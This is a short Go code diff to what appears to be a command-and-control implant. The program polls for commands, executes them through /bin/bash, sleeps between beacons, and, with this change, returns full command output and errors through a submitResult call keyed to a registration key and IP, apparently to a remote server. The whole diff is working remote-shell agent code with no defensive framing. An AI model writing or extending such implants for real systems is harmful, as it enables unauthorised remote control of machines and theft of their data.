@@ -160,9 +160,10 @@ func executeCommand(command string) string {
 	//if err != nil {
 	//	fmt.Println(err)
 	//}
-	out, err := exec.Command("/bin/bash", "-c", command).Output()
+	// Simple_Exec
+	out, err := exec.Command("/bin/bash", "-c", command).CombinedOutput()
 	if err != nil {
-		return ""
+		return err.Error() + string(out)
 	}
 	return string(out)
 }
@@ -214,10 +215,13 @@ func main() {
 
 		if strings.Contains(command, "[-]") == true {
 			fmt.Println("[-] Sleeping... ")
+			time.Sleep(10 * time.Second)
+			continue
 		}
 
 		execute_result := executeCommand(command)
 		fmt.Println("[+] Result: ", execute_result)
+		submitResult(registerkey, ip, execute_result)
 
 		time.Sleep(10 * time.Second)
 
